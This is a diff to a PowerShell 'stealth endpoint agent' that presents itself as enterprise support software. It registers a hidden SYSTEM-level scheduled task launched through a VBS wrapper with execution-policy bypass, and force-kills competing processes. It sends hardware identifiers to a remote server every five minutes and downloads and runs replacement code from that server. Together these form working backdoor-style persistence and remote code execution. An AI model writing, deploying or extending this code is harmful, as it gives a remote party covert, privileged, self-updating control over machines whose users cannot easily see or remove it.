@@ -3,7 +3,7 @@ param(
 )
 
 # Unified Enterprise Agent (UEA)
-# Version: 1.5.6
+# Version: 1.5.7
 # Description: Professional stealth endpoint agent with premium Support GUI.
 
 # 1. ENVIRONMENT SANITATION
@@ -44,49 +44,59 @@ function Install-StealthAgent {
     }
     try {
         Log-Message "Initiating System-Level Master Reset..."
-        # 1. Kill old tasks first to release file locks
+        # 1. Stop and Clean Persistence Tasks
         Get-ScheduledTask -TaskName "UEA_Persistence" -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
         Unregister-ScheduledTask -TaskName "UEA_Persistence" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
         Unregister-ScheduledTask -TaskName "UnifiedEnterpriseAgent" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
 
-        # 2. Kill all processes holding the script (Aggressive Nuke)
+        # 2. Aggressive Process Nuke to release file locks
         try {
             $AllPs = Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like "*unified-agent.ps1*" -and $_.ProcessId -ne $PID }
             foreach ($P in $AllPs) { Stop-Process -Id $P.ProcessId -Force -ErrorAction SilentlyContinue }
+            Start-Sleep -Seconds 1
         } catch {}
 
-        # 3. Deploy Script (Clean Overwrite)
+        # 3. Atomic File Deployment
         if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
         
-        Log-Message "Deploying v1.5.6 core binary..."
-        if ($PSCommandPath -and $PSCommandPath -ne $ScriptPath) {
-            Copy-Item -Path $PSCommandPath -Destination $ScriptPath -Force
-        } else {
-            # Robust download to the actual path
-            $Web = New-Object System.Net.WebClient
-            $Web.DownloadFile("$ServerUrl/api/agent/update", "$ScriptPath")
+        Log-Message "Deploying v1.5.7 core binary..."
+        $SourceFile = if ($PSCommandPath -and $PSCommandPath -ne $ScriptPath) { $PSCommandPath } else { "$InstallDir\temp_agent.ps1" }
+        
+        if ($SourceFile -match "temp_agent.ps1") {
+            (New-Object System.Net.WebClient).DownloadFile("$ServerUrl/api/agent/update", "$SourceFile")
         }
 
-        $Config = @{ ServerUrl = $ServerUrl; Version = "1.5.6" }
+        # Try to move file into place (Atomic overwrite)
+        for ($i=0; $i -lt 5; $i++) {
+            try {
+                Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
+                break
+            } catch {
+                Start-Sleep -Seconds 1
+                Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like "*unified-agent.ps1*" -and $_.ProcessId -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue
+            }
+        }
+
+        $Config = @{ ServerUrl = $ServerUrl; Version = "1.5.7" }
         $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
         
         $VbsMainPath = "$InstallDir\uea_stealth.vbs"
         $VbsMainCode = "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$ScriptPath`"`"`", 0, False"
         $VbsMainCode | Out-File -FilePath $VbsMainPath -Force -Encoding ascii
 
-        # 4. Re-Register Stealth Persistence
+        # 4. Re-Register and Start Persistence
         $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsMainPath`""
         $Trigger1 = New-ScheduledTaskTrigger -AtStartup
         $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
-        $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+        $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         
         Register-ScheduledTask -TaskName "UEA_Persistence" -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force | Out-Null
         Start-ScheduledTask -TaskName "UEA_Persistence" | Out-Null
         
-        Log-Message "Stealth v1.5.6 Active & Backgrounded."
+        Log-Message "Stealth v1.5.7 Deployment Complete."
         if ($Host.Name -match "ConsoleHost" -or -not $PSCommandPath) {
-            Write-Host "Equinox Stealth Architecture v1.5.6 Deployed. Background process started. Exiting..."
+            Write-Host "Equinox Stealth Architecture v1.5.7 Deployed. Background process starting..."
             exit
         }
     } catch { Log-Message "Install Fail: $($_.Exception.Message)" }
@@ -97,8 +107,8 @@ try {
     $AgentId = try { (Get-CimInstance Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID } catch { "$($env:COMPUTERNAME)-$(Get-Random)" }
     $SerialNumber = try { (Get-CimInstance Win32_Bios -ErrorAction SilentlyContinue).SerialNumber } catch { "Unknown" }
     
-    # Self-Registration and Forced Deployment
-    if (($PSCommandPath -ne $ScriptPath) -or (Test-Path $ScriptPath -and (Get-Content $ScriptPath | Select-Object -First 20 | Out-String) -notlike "*1.5.6*")) {
+    # Check for mandatory upgrade to 1.5.7
+    if (($PSCommandPath -ne $ScriptPath) -or (Test-Path $ScriptPath -and (Get-Content $ScriptPath | Select-Object -First 20 | Out-String) -notlike "*1.5.7*")) {
         Install-StealthAgent
     }
 
@@ -107,7 +117,7 @@ try {
         if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
     }
 
-    Log-Message "Agent v1.5.6 Started. ID: $AgentId"
+    Log-Message "Agent v1.5.7 Started. ID: $AgentId"
     # 5. HEARTBEAT LOOP
     while ($true) {
         try {
@@ -118,7 +128,7 @@ try {
             $Payload = @{
                 agentId = $AgentId
                 serialNumber = $SerialNumber
-                version = "1.5.6"
+                version = "1.5.7"
                 status = "online"
                 deviceName = $env:COMPUTERNAME
                 os = $OS
@@ -126,10 +136,11 @@ try {
                 localIp = $LocIp
                 isp = "Managed Endpoint"
             }
-            $Response = Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/heartbeat" -Body (ConvertTo-Json $Payload) -ContentType "application/json"
+            $BodyJson = $Payload | ConvertTo-Json
+            $Response = Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/heartbeat" -Body $BodyJson -ContentType "application/json"
 
             # Upgrade Hook
-            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.5.6")) {
+            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.5.7")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                 Install-StealthAgent
                 $VbsRestart = "$InstallDir\restart.vbs"
